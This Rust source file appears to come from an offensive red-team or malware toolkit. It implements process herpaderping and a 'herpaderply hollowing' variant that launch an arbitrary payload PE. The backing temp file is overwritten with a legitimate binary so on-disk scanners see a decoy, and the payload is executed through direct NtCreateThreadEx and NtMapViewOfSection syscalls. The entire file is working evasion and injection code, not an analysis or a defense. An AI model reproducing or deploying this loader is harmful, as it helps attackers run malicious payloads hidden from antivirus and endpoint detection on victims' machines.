use std::ptr::null_mut;

use windows_sys::Win32::System::Threading::THREAD_ALL_ACCESS;

use crate::{
    log, syscall,
    techniques::{
        pe::process_ghosting::ghost_process::{create_ghost_process, initialize_process_parms},
        process_utils::terminate,
    },
};
use herpaderp_context::*;
use overwrite_tmp_file::overwrite_tmp_file;

mod herpaderp_context;
mod overwrite_tmp_file;

pub unsafe fn process_herpaderping(payload: &[u8]) {
    unsafe {
        log!("Starting process_herpaderping ...");

        if let Some(ctx) = prepare_herpaderp_context(payload) {
            // Step 8: Create process from section
            let process_handle = match create_ghost_process(ctx.section_handle) {
                Some(h) => {
                    log!("Herpaderp process created.");
                    h
                }
                None => {
                    log!("Failed to create ghost process.");
                    syscall!("NtClose", ctx.section_handle);
                    syscall!("NtClose", ctx.legit_pe);
                    syscall!("NtClose", ctx.tmp_pe);
                    return;
                }
            };

            // Step 9: Overwrite tmp file with legit PE
            if !overwrite_tmp_file(Some(ctx.legit_pe), None, None, ctx.tmp_pe, true) {
                log!("overwrite_tmp_file with legit PE failed.");
                syscall!("NtClose", ctx.section_handle);
                syscall!("NtClose", process_handle);
                syscall!("NtClose", ctx.legit_pe);
                syscall!("NtClose", ctx.tmp_pe);
                return;
            }

            log!("Overwrote the temporary file with the legitimate binary.");

            // Step 10: Initialize process parameters
            let mut image_base: *mut core::ffi::c_void = null_mut();
            let success = initialize_process_parms(
                process_handle,
                ctx.tmp_file_path_utf16.as_ptr(),
                &mut image_base,
            );
            if !success || image_base.is_null() {
                log!("InitializeProcessParms failed.");
                syscall!("NtClose", ctx.section_handle);
                syscall!("NtClose", process_handle);
                syscall!("NtClose", ctx.legit_pe);
                syscall!("NtClose", ctx.tmp_pe);
                return;
            }

            log!("Process PEB image base: 0x{:p}", image_base);

            // Step 11: Parse PE entry point
            let (_, nt) = super::super::pe_utils::parse_headers(payload);
            let entry_point = image_base.byte_add(nt.OptionalHeader.AddressOfEntryPoint as usize);

            log!("Herpaderp process entry point: 0x{:p}", entry_point);

            // Step 12: NtCreateThreadEx
            let mut thread: usize = 0;
            let status = syscall!(
                "NtCreateThreadEx",
                &mut thread as *mut usize,
                THREAD_ALL_ACCESS,
                null_mut::<u8>(),
                process_handle,
                entry_point,
                null_mut::<u8>(),
                0,
                0,
                0,
                0,
                null_mut::<u8>()
            );

            if status != 0 {
                log!("NtCreateThreadEx failed: 0x{:08X}", status);
                syscall!("NtClose", ctx.section_handle);
                syscall!("NtClose", process_handle);
                syscall!("NtClose", ctx.legit_pe);
                syscall!("NtClose", ctx.tmp_pe);
                return;
            }

            log!("Payload PE executed with thread ID: {}", thread as u32);

            // Cleanup
            syscall!("NtClose", ctx.section_handle);
            syscall!("NtClose", process_handle);
            syscall!("NtClose", ctx.legit_pe);
            syscall!("NtClose", ctx.tmp_pe);

            log!("process_herpaderping completed.");
        }
    }
}

pub unsafe fn herpaderply_hollowing(payload: &[u8]) {
    unsafe {
        use crate::techniques::process_utils::create_process;
        use ntapi::ntmmapi::ViewUnmap;
        use windows_sys::Win32::System::Memory::PAGE_READONLY;

        log!("Starting herpaderply_hollowing ...");

        if let Some(ctx) = prepare_herpaderp_context(payload) {
            // Step 8: Create suspended process (aitstatic.exe coffee)
            let pi = create_process(true, false, true).unwrap();
            let (_, nt) = super::super::pe_utils::parse_headers(payload);

            // Step 9: Map section into remote process
            let mut base_address: usize = 0;
            let mut view_size: usize = 0;
            let status = syscall!(
                "NtMapViewOfSection",
                ctx.section_handle,
                pi.hProcess,
                &mut base_address,
                0,
                0,
                null_mut::<u8>(),
                &mut view_size,
                ViewUnmap,
                0,
                PAGE_READONLY
            );
            if status < 0 {
                log!("NtMapViewOfSection failed: 0x{:X}", status);
                terminate(pi.hProcess);
                return;
            }

            log!(
                "Base address of mapped Herpaderp section: 0x{:X}",
                base_address
            );

            // Step 10: Overwrite tmp file with legit PE
            if !overwrite_tmp_file(Some(ctx.legit_pe), None, None, ctx.tmp_pe, true) {
                log!("overwrite_tmp_file with legit PE failed.");
                terminate(pi.hProcess);
                return;
            }

            log!("Overwrote the temporary file with the legitimate binary.");

            if !crate::techniques::pe::process_hollowing::hollow_process(
                pi,
                base_address,
                nt.OptionalHeader.AddressOfEntryPoint,
            ) {
                log!("Hollowing process failed.");
                return;
            }

            log!("herpaderply_hollowing completed.");

            // Cleanup the HerpaderpContext file handles (tmp_pe, legit_pe, section_handle)
            syscall!("NtClose", ctx.section_handle);
            syscall!("NtClose", ctx.legit_pe);
            syscall!("NtClose", ctx.tmp_pe);
        }
    }
}
